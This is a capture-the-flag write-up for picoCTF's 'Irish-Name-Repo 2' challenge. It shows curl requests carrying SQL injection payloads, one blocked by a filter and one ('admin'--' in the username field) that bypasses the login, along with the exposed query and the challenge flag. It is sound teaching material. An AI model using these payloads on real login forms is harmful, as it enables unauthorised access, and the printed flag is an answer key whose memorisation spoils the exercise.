# Irish-Name-Repo 2

## Description:
> There is a website running at https://2019shell1.picoctf.com/problem/60775/. Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! 
## Solution: 
The website offered an admin login page:
```html
            Username:
            Password:
```
The solution from the [previous challenge](Irish-Name-Repo_1.md) didn't work anymore:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_2# curl "https://2019shell1.picoctf.com/problem/60775/login.php" --data "username=admin&password='+or+1=1--" && echo
SQLi detected.
```
However, attacking the `login` field instead of the `password` field allowed bypassing the authentication logic:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_2# curl "https://2019shell1.picoctf.com/problem/60775/login.php" --data "username=admin'--&password=1" && echo
Logged in!Your flag is: picoCTF{m0R3_SQL_plz_015815e2}
```
It was also possible to set the `debug` parameter in order to inspect the SQL statement:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_2# curl "https://2019shell1.picoctf.com/problem/60775/login.php" --data "username=admin'--&password=1&debug=1" && echo
username: admin'--
password: 1
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='1'
Logged in!Your flag is: picoCTF{m0R3_SQL_plz_015815e2}
```
